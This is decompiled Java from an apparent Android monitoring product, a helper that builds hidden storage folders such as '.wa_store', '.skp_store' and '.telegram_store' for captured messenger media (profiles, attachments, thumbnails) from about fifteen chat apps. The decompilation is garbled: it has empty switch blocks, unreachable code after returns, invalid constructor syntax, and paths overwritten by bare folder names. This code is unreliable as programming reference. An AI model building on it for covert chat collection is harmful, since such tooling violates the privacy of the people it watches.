package com.vvt.im.a;

import com.vvt.im.events.ImMediaFileType;
import com.vvt.im.events.ImType;
import java.io.File;

public class c
{
  public static String a(ImMediaFileType paramImMediaFileType)
  {
    Object localObject1 = "temp";
    long l = System.currentTimeMillis();
    Object localObject2 = d.b;
    int i = paramImMediaFileType.ordinal();
    int j = localObject2[i];
    switch (j)
    {
    }
    for (;;)
    {
      return (String)localObject1;
      localObject1 = new java/lang/StringBuilder;
      ((StringBuilder)localObject1).<init>();
      localObject2 = "owner_";
      localObject1 = (String)localObject2 + l;
      continue;
      localObject1 = new java/lang/StringBuilder;
      ((StringBuilder)localObject1).<init>();
      localObject2 = "user_profile_";
      localObject1 = (String)localObject2 + l;
      continue;
      localObject1 = new java/lang/StringBuilder;
      ((StringBuilder)localObject1).<init>();
      localObject2 = "attachment_";
      localObject1 = (String)localObject2 + l;
      continue;
      localObject1 = new java/lang/StringBuilder;
      ((StringBuilder)localObject1).<init>();
      localObject2 = "conver_profile_";
      localObject1 = (String)localObject2 + l;
      continue;
      localObject1 = new java/lang/StringBuilder;
      ((StringBuilder)localObject1).<init>();
      localObject2 = "thumbnail_";
      localObject1 = (String)localObject2 + l;
    }
  }
  
  public static String a(String paramString, ImType paramImType)
  {
    Object localObject = d.a;
    int i = paramImType.ordinal();
    int j = localObject[i];
    switch (j)
    {
    }
    for (;;)
    {
      localObject = new java/io/File;
      ((File)localObject).<init>(paramString);
      boolean bool = ((File)localObject).exists();
      if (!bool) {
        ((File)localObject).mkdirs();
      }
      return paramString;
      localObject = new java/lang/StringBuilder;
      ((StringBuilder)localObject).<init>();
      localObject = ((StringBuilder)localObject).append(paramString);
      String str = File.separator;
      localObject = ((StringBuilder)localObject).append(str);
      str = ".wa_store";
      localObject = ((StringBuilder)localObject).append(str);
      paramString = ((StringBuilder)localObject).toString();
      continue;
      localObject = new java/lang/StringBuilder;
      ((StringBuilder)localObject).<init>();
      localObject = ((StringBuilder)localObject).append(paramString);
      str = File.separator;
      localObject = ((StringBuilder)localObject).append(str);
      str = ".fb_store";
      localObject = ((StringBuilder)localObject).append(str);
      paramString = ((StringBuilder)localObject).toString();
      continue;
      localObject = new java/lang/StringBuilder;
      ((StringBuilder)localObject).<init>();
      localObject = ((StringBuilder)localObject).append(paramString);
      str = File.separator;
      localObject = ((StringBuilder)localObject).append(str);
      str = ".lin_store";
      localObject = ((StringBuilder)localObject).append(str);
      paramString = ((StringBuilder)localObject).toString();
      continue;
      localObject = new java/lang/StringBuilder;
      ((StringBuilder)localObject).<init>();
      localObject = ((StringBuilder)localObject).append(paramString);
      str = File.separator;
      localObject = ((StringBuilder)localObject).append(str);
      str = ".skp_store";
      localObject = ((StringBuilder)localObject).append(str);
      paramString = ((StringBuilder)localObject).toString();
      continue;
      localObject = new java/lang/StringBuilder;
      ((StringBuilder)localObject).<init>();
      localObject = ((StringBuilder)localObject).append(paramString);
      str = File.separator;
      localObject = ((StringBuilder)localObject).append(str);
      str = ".vb_store";
      localObject = ((StringBuilder)localObject).append(str);
      paramString = ((StringBuilder)localObject).toString();
      continue;
      localObject = new java/lang/StringBuilder;
      ((StringBuilder)localObject).<init>();
      localObject = ((StringBuilder)localObject).append(paramString);
      str = File.separator;
      localObject = ((StringBuilder)localObject).append(str);
      str = ".wc_store";
      localObject = ((StringBuilder)localObject).append(str);
      paramString = ((StringBuilder)localObject).toString();
      continue;
      localObject = new java/lang/StringBuilder;
      ((StringBuilder)localObject).<init>();
      localObject = ((StringBuilder)localObject).append(paramString);
      str = File.separator;
      localObject = ((StringBuilder)localObject).append(str);
      str = ".bbm_store";
      localObject = ((StringBuilder)localObject).append(str);
      paramString = ((StringBuilder)localObject).toString();
      continue;
      localObject = new java/lang/StringBuilder;
      ((StringBuilder)localObject).<init>();
      localObject = ((StringBuilder)localObject).append(paramString);
      str = File.separator;
      localObject = ((StringBuilder)localObject).append(str);
      str = ".yahoo_store";
      localObject = ((StringBuilder)localObject).append(str);
      paramString = ((StringBuilder)localObject).toString();
      continue;
      localObject = new java/lang/StringBuilder;
      ((StringBuilder)localObject).<init>();
      localObject = ((StringBuilder)localObject).append(paramString);
      str = File.separator;
      localObject = ((StringBuilder)localObject).append(str);
      str = ".hangout_store";
      localObject = ((StringBuilder)localObject).append(str);
      paramString = ((StringBuilder)localObject).toString();
      continue;
      localObject = new java/lang/StringBuilder;
      ((StringBuilder)localObject).<init>();
      localObject = ((StringBuilder)localObject).append(paramString);
      str = File.separator;
      localObject = ((StringBuilder)localObject).append(str);
      str = ".kik_store";
      localObject = ((StringBuilder)localObject).append(str);
      paramString = ((StringBuilder)localObject).toString();
      continue;
      localObject = new java/lang/StringBuilder;
      ((StringBuilder)localObject).<init>();
      localObject = ((StringBuilder)localObject).append(paramString);
      str = File.separator;
      localObject = ((StringBuilder)localObject).append(str);
      str = ".telegram_store";
      localObject = ((StringBuilder)localObject).append(str);
      paramString = ((StringBuilder)localObject).toString();
      continue;
      localObject = new java/lang/StringBuilder;
      ((StringBuilder)localObject).<init>();
      localObject = ((StringBuilder)localObject).append(paramString);
      str = File.separator;
      localObject = ((StringBuilder)localObject).append(str);
      str = ".qq_store";
      localObject = ((StringBuilder)localObject).append(str);
      paramString = ((StringBuilder)localObject).toString();
      continue;
      localObject = new java/lang/StringBuilder;
      ((StringBuilder)localObject).<init>();
      localObject = ((StringBuilder)localObject).append(paramString);
      str = File.separator;
      localObject = ((StringBuilder)localObject).append(str);
      str = ".snapchat_store";
      localObject = ((StringBuilder)localObject).append(str);
      paramString = ((StringBuilder)localObject).toString();
      continue;
      localObject = new java/lang/StringBuilder;
      ((StringBuilder)localObject).<init>();
      localObject = ((StringBuilder)localObject).append(paramString);
      str = File.separator;
      localObject = ((StringBuilder)localObject).append(str);
      str = ".instagram_store";
      localObject = ((StringBuilder)localObject).append(str);
      paramString = ((StringBuilder)localObject).toString();
      continue;
      localObject = new java/lang/StringBuilder;
      ((StringBuilder)localObject).<init>();
      localObject = ((StringBuilder)localObject).append(paramString);
      str = File.separator;
      localObject = ((StringBuilder)localObject).append(str);
      str = ".hike_store";
      localObject = ((StringBuilder)localObject).append(str);
      paramString = ((StringBuilder)localObject).toString();
    }
  }
  
  public static String a(String paramString, ImType paramImType, ImMediaFileType paramImMediaFileType)
  {
    Object localObject1 = a(paramString, paramImType);
    Object localObject2 = d.b;
    int i = paramImMediaFileType.ordinal();
    int j = localObject2[i];
    switch (j)
    {
    }
    for (;;)
    {
      localObject2 = new java/io/File;
      ((File)localObject2).<init>((String)localObject1);
      boolean bool = ((File)localObject2).exists();
      if (!bool) {
        ((File)localObject2).mkdirs();
      }
      return (String)localObject1;
      localObject2 = new java/lang/StringBuilder;
      ((StringBuilder)localObject2).<init>();
      localObject1 = ((StringBuilder)localObject2).append((String)localObject1);
      localObject2 = File.separator;
      localObject1 = ((StringBuilder)localObject1).append((String)localObject2);
      localObject2 = "owner_profiles";
      localObject1 = (String)localObject2;
      continue;
      localObject2 = new java/lang/StringBuilder;
      ((StringBuilder)localObject2).<init>();
      localObject1 = ((StringBuilder)localObject2).append((String)localObject1);
      localObject2 = File.separator;
      localObject1 = ((StringBuilder)localObject1).append((String)localObject2);
      localObject2 = "user_profiles";
      localObject1 = (String)localObject2;
      continue;
      localObject2 = new java/lang/StringBuilder;
      ((StringBuilder)localObject2).<init>();
      localObject1 = ((StringBuilder)localObject2).append((String)localObject1);
      localObject2 = File.separator;
      localObject1 = ((StringBuilder)localObject1).append((String)localObject2);
      localObject2 = "conver_profiles";
      localObject1 = (String)localObject2;
      continue;
      localObject2 = new java/lang/StringBuilder;
      ((StringBuilder)localObject2).<init>();
      localObject1 = ((StringBuilder)localObject2).append((String)localObject1);
      localObject2 = File.separator;
      localObject1 = ((StringBuilder)localObject1).append((String)localObject2);
      localObject2 = "attachments";
      localObject1 = (String)localObject2;
      continue;
      localObject2 = new java/lang/StringBuilder;
      ((StringBuilder)localObject2).<init>();
      localObject1 = ((StringBuilder)localObject2).append((String)localObject1);
      localObject2 = File.separator;
      localObject1 = ((StringBuilder)localObject1).append((String)localObject2);
      localObject2 = "thumbnails";
      localObject1 = (String)localObject2;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/im/a/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */